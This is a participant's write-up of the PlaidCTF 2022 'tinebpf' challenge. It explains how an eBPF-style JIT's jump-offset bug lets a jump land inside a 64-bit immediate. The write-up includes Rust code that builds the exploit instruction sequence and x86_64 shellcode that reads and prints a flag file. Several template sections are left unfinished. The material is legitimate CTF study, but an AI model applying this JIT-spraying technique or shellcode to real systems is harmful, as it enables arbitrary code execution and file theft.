# PlaidCTF 2022: tinebpf

Participant: Robert Obkircher

This repository contains my solution but also parts of the handout:

- Archive: `tinebpf.*.tgz`
- Modified: `Cargo.lock`, `Cargo.toml`, `src/main.rs`
- Unmodified: `docker-compose.yml`, `Dockerfile`, `flag.txt`, `target/debug/tinebpf`, `xinetd.conf`

## TL;DR / Short Summary

We are given the source code of a rust program that reads hex encoded eBPF like instructions, jit compiles them into x86_64 machine code and executes it.
The instructions themselves can't do anything interesting, but there is a bug in the calculation of the jump offsets which allows us to jump into an immediate value and execute arbitrary machine code.

## Task Description

> (pwn)
>
> Take a byte out of every pretty fun snack available here. We made these to help us improve our scrutiny of the messages flying around the Plaidiverse.
>
> tinebpf.chal.pwni.ng 1337

> Provide a task description containing all the basic information:
> 
> * Goal of the task
> * General type of task (web application, cryptography, ...)
> * Available resources (source code, binary-only, network service, ...)
> * Any hints you might noticed in the description of the organizers
> * ...


## Analysis Steps

> Explain your analysis in detail. Cover all the technical aspects, including the used tools and commands. Mention other collaborators and distinguish contributions.

### Initial steps

1. Install `rustup` and `IntelliJ Idea` with the Rust plugin and open the project.
2. Have a look at the files:
   - The `Dockerfile` maps `flag.txt` to `/flag.txt`
   - `docker-compose.yml` and `xinetd.conf` run the program on port 1337.
   - The only two crates in `Cargo.toml` are `hex` for hex decoding and `memmap2` for creating executable pages.
   - `main.rs` is the only rust file
3. Open `main.rs` and use the `Expand All to Level 2` action get an overview:
   - `MAXBPFINST = 128`: we can send at most this many instructions
   - Machine code related definitions:
       - `PROLOGUE`: clears all integer registers to zero
       - `EPILOGUE`: exit syscall
       - `enum X86RegT`
   - eBPF related definitions
       - `enum BpfRegT`
       - `struct BpfInstT`
       - `enum BpfClassT`: Immediate/Alu/Jump
       - `enum BpfModeT`: Only BpfImm is supported, no other memory access modes.
       - `enum BpfSrcT { BpfX, BpfK }`: Not sure what these mean.
       - `enum BpfAluOpT`, `enum BpfJmpOpT`: Both have ~12 members
   - impls and macros to produce machine code
   - `fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u8]>) -> Option<usize>`
   - `fn verify_jmps(b_inst: &[BpfInstT]) -> Result<(), &str>`
   - `fn parse_raw_bytes(inp: &[u8]) -> Option<Vec<BpfInstT>>`: essentially a bitcast
   - `main`: 
     1. Read a line from stdin, trim it, hex decode it, check that the size is at most 128 instructions and parse the input into `Vec<BpfInstT>`
     2. Call `verify_jumps`
     3. Initialize `addrs[i]` to `PROLOGUE.len() + 64 * i`: This represents the address of the ith instruction.
     4. Call `do_jit` 20 times with mutable `addrs` and set a boolean if the machine code size didn't change in two successive iterations.
     5. If the boolean was set: call `do_jit` again to produce a final output image, copy it into executable memory, flush stdout, and call it as a function.
4. Google eBPF and find out what it is: BPF stands for Berkeley Packet Filter and eBPF is an extended BPF JIT virtual machine in the Linux kernel.[^1]
5. Check if there are any obvious mistakes (e.g. in verify_jmps) by reading most of the code. Nothing found.
6. Create git repo.
7. Move part of main into function `fn run(insts: &Vec<BpfInstT>)`.
8. Google about fuzzing and try `cargo-fuzz` and `afl`. See [Failed Attempts: Fuzzing](#fuzzing) below.
9. Write a Rust function to systematically generate all supported instructions (with constant `off` and `imm`), write the machine code to a file and call `ndisasm` to disassemble it.
   Notice that there are push/pop instructions generated. However, they don't allow us to manipulate the caller stack and that wouldn't help anyway because the epilogue calls system exit.  
   Example instruction: `BpfInstT { opc: 36, regs: 1, off: 0, imm: 0 }`
    ```
    00000000  4831C0            xor rax,rax
    ...
    0000002A  4D31FF            xor r15,r15

    0000002D  50                push rax
    0000002E  52                push rdx
    0000002F  4989FB            mov r11,rdi
    00000032  31C0              xor eax,eax
    00000034  41F7E3            mul r11d
    00000037  5A                pop rdx
    00000038  4889C7            mov rdi,rax
    0000003B  58                pop rax

    0000003C  B83C000000        mov eax,0x3c
    00000041  0F05              syscall
    ```
10. At this point I gave up because I was too tired after staying up all night I and wanted to try something easier.
    I went back to this challenge right before the end, but it was already too late and I didn't know how to continue.
    After the CTF was over I deliberately didn't look at any solutions and a few days later I tried again.
 
    In the meantime I had understood the purpose of the 20 iterations with the `addrs` array:
    x86_64 machine code instructions have variable length.
    The `addrs` array contains the machine code offset for each eBPF instruction.
    The `emit_cond_jump` function uses the `addrs` array to compute jump offset and emits either a smaller instruction with an 8 bit immediate or a larger one with 32 bits.
    Because the offsets can change after a branch has been emitted this needs to be repeaded until `addrs` doesn't change anymore.

    I had two main ideas: 1) There might be an overflow of an offset somewhere. 2) Whether `addrs` changes is detected with the total length of the generated instructions, but this does not take into account, that one instruction could have gotten smaller and another larger in the same iteration.

11. Look for overflow and indexing bugs. See [Failed Attempts: Overflow and indexing bugs](#overflow-and-indexing-bugs)
12. If we have instructions:
    `i1, jump i2, ...128 bytes..., jump i1, i2`
    It could be that the size of both jumps oscilates between 8 and 32 byte immediates which would result in an invalid jump at the end.
    At this point I wasted a lot of time with afl and cargo-fuzz again to try to find such a series of instructions.
    See [Failed Attempts: Fuzzing](#fuzzing) below.
13. Try to find growing/shrinking instructions by hand: By looking at the function `code()` and at machine code I tried to find a way to grow and shrink instructions. Shrinking was easy, but I couldn't come up with anything that grew.
14. Write code that prints a histogram of instruction sizes. The largest one ws 25 bytes, which is not enough to match the 64 bytes from `let mut olen = insts.len() * 64;`.
15. Look at some CVEs to get some ideas.
16. Continue to look for instructions that expand: jumps with offset 0 are size zero, but there is no way to change the offset.

### Breakthrough

| jump direction | destination addr | source addr |
|----------------|------------------|-------------|
| forward        | old              | old         |
| backward       | new              | old         |

The offset computation of forward and backward jumps differs because `addrs` is updated in place.
Forward jumps always use both offsets from the previous iteration.
Backward jumps on the other hand observe the address of the destination that was computed in the current iteration.
When instructions before the target shrink then the backwards jump could get larger.

### A failed attempt?

I immediately tried to find instructions with oscilating sizes. 
Later I found out that this still required an expanding instruction to get into case 2.

| case  | f=forward jump | s=space | b=backward jump | i=instruction |
|-------|----------------|---------|-----------------|---------------|
| __1__ | f1=5           | s1      | b1=2            | i1            |
| __2__ | f2=2           | s2      | b2=5            | i2            |


| transition | jump   | constraint            | assuming s1=s2 |
|------------|--------|-----------------------|----------------|
| 1 -> 2     | b1->s2 | (3 + s1 + b1) > 128   | s >= 124       | 
| 1 -> 2     | f1->i1 | (s1 + b1) <= 127      | s <= 125       |
| 2 -> 1     | b2->s1 | (-3 + b2 + s2) <= 128 | s <= 126       |
| 2 -> 1     | f2->i2 | (s2 + b2) > 127       | s >= 123       |

It follows that `124 <= s <= 125`.

There are two remaining problems:
- After iteration 0 all jumps are large: This shouldn't be a problem, because f1 shrinks even if f2 is large, which means that we are in case 2 after iteration 1. (I later found out that this is wrong).
- We need to figure out where the invalid jump goes and if we can place a payload there:
  After iteration 2 we are in case 1 and we exit the loop because the size didn't change. 
  This means that in the final code the layout of the instructions will be like case 2:
  - f2 to i2 should be s+b2 = s+5
  - b2 to s2 should be s+5
  But the offsets will be:
  - off(f2) = addr(i1) - addr(s1) = s1 + b1 = s+2
  - off(b2) = addr(s2) - addr(i1) = s1 + b1 + 3 = s+5
  
  This means that the forward jump will be 3 bytes too short.
  We can place an immediate right at the end of s and we don't have to put any instructions before f.

### Finding a growing instruction

| i1: shrinks | i2: target | i3: space | i4: backwards jump | i5 |
|-------------|------------|-----------|--------------------|----|

1. i1 shrinks from 5 to 2.
2. i2 moves by 3
3. i4 grows by 3 because it reads the new position of i2 but the old position of i5.

for simplicity assume s are instructions of size 1

| byte size      | f to (s123-s125) | f to s127 | s      | b to sx | 
|----------------|------------------|-----------|--------|-----------|
| initial        | 64               | 64        | 64 * s | 64        |
| after 1*do_jit | 2*5              | 5         | s      | 5         |
| after 2*do_jit | 2*5              | 2         | s      | 2         |
| after 3*do_jit | 2*2              | 2         | s      | 5         |

While experimenting around I found a solution where the backwards jump expands during the 3rd do_jit:

```rust
fn exploit() {
    let mut instructions = vec![];

    // shrink 2
    // off: 5 2 10 2 bytes
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });

    // shrink 1
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b

    for _ in 0..11 {
        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
    }

    let n = 9;
    for _ in 0..n {
        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
    }

    // off: 2|5 2 10
    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });

    run(&instructions);
}
```

If I move the forward jump that collapses first to the right then we shoudl be able to use approach 1.


### Verifying the encoding of instructions

By looking at the code we can see that only 8 byte immediates are supported and as long as the immediate is large enough `emit_mov_imm64` will emit 10 bytes.
For the remaining 4 or 5 bytes we can use 2 byte jumps that jump to themselves.

```rust
let instructions = vec![
    BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
    BpfInstT { opc: 0x18, regs: 0, off: 0, imm: 0xb3b2b1b0u32 as i32 },
    BpfInstT { opc: 0,    regs: 0, off: 0, imm: 0xb7b6b5b4u32 as i32 },
    BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
];
...
let output_size = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
disassemble(&image[PROLOGUELEN..output_size - EPILOGUELEN], "some_instructions")
```
The output is as expected:
```
00000000  EBFE              jmp short 0x0
00000002  48B8B0B1B2B3B4B5  mov rax,0xb7b6b5b4b3b2b1b0
-B6B7
0000000C  EBFE              jmp short 0xc
```

### Creating the exploit

I wrote some assembly and compiled it into binary:
```shell
nasm -f bin payload.asm
ndisasm -b 64 payload
```
output:
```
00000000  48890424          mov [rsp],rax
00000004  48895C2408        mov [rsp+0x8],rbx
00000009  4889E7            mov rdi,rsp
0000000C  B802000000        mov eax,0x2
00000011  0F05              syscall
00000013  4889C7            mov rdi,rax
00000016  4889E6            mov rsi,rsp
00000019  BA64000000        mov edx,0x64
0000001E  4831C0            xor rax,rax
00000021  0F05              syscall
00000023  BF01000000        mov edi,0x1
00000028  4889F8            mov rax,rdi
0000002B  0F05              syscall
```

Manually record the sizes. In an 8 byte immediate we can use at most 6 bytes, because the last 2 are requried for the jump.
```rust
    let payload_sizes = [4, 5, 3, 5, 2+3, 3, 5, 3+2, 5, 3+2];
```

For the first version of my exploit I reduced the size of the payload as much as possible
to fit it into 10 immediates. 

In the final solution for this writeup I improved the payload (e.g. it only prints the bytes that were actually read from the file)
and I automated the machine code generation and the extraction of the instruction sizes.

## Vulnerabilities / Exploitable Issue(s)

> List security issues you discovered in the scope of the task and how they could be exploited.

overflow
code injection

## Solution

> Provide a clean (i.e., without analysis and research steps) guideline to get from the task description to the solution. If you did not finish the task, take your most promising approach as a goal.

## Failed Attempts

> Describe attempts apart from the solution above which you tried. Recap and try to explain why they did not work.

### Fuzzing
I tried fuzzing with random instructions to get a crash, but in hindsight it would have been better to use a more systematic approach first.

### Overflow and indexing bugs

While reading/skimming the code I thought about lots of logic bugs. Here are some of them:

Look at `emit_cond_jump` for possible overflows. The macros `is_imm8` and `is_simm32` seem to be correct, but when `joff` is computed there is a suspicious cast to `i16`, even though `verify_jumps` treats `idx` and `off` as `i32`:
```rust
    let joff = addrs[((cidx + 1) as i16 + off) as usize] as i64 - addrs[cidx + 1] as i64;
```

- `cidx + 1` is in range (0, 128]
- `off` is an `i16` that is part of the input
- `verify_jumps` ensures that their 32 bit sum is in (1, 128]. This means that there is probably no overflow. 

Even if there were an overflow it would not be exploitable, because the `Dockerfile` copies a debug build, which means that overflow checks are probably enabled.

Look at the match statement in `do_jit`. There are 5 patterns that start with `BpfJmp`. The first 4 simply call `emit_cond_jump`.
At first glance last one seems interesting, because it sets `jmpoff` to -2 if `cinst.off == -1` and it emits a 2 byte `JMP rel8` instruction (relative to the EIP register, which contains the address of following instruction). However this simply avoids one extra iteration until the offset could be computed from `addrs`.
I also looked at the opcode bytes of `emit_cond_jump` and of the last one, but they seem reasonable.

Look at `veriy_jumps`: Think about jumping into immediates or other indexing bugs. Find nothing.

## Alternative Solutions

> If you can think of an alternative solution (or there are others already published), compare your attempts with those.

## Lessons Learned

> Document what you learned during the competition.
 
- Skipping sleep was a bad idea
- I shouldn't have given up without asking others
- How to fuzz rust code with `cargo-fuzz` and `afl`. 
- The timeout parameter of cargo fuzz didn't work.
- I learned about the `Arbitrary` trait to generate random Rust datastructures.
- I learned what eBPF is

Test [^5]

## References

> List external resources (academic papers, technical blogs, CTF writeups, ...) you used while working on this task.

- [^1]: eBPF: https://ebpf.io/ https://en.wikipedia.org/wiki/Berkeley_Packet_Filter
- [^5] unofficial eBPF documentation: https://github.com/iovisor/bpf-docs/blob/master/eBPF.md
- git repo: https://gitlab.defbra.xyz/ro/tinebpf (ssh://git@gitlab.defbra.xyz:1850/ro/tinebpf.git)
- fuzzing Rust (cargo-fuzz and afl): https://rust-fuzz.github.io/book/introduction.html
- amd64 instructions: https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf
- http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

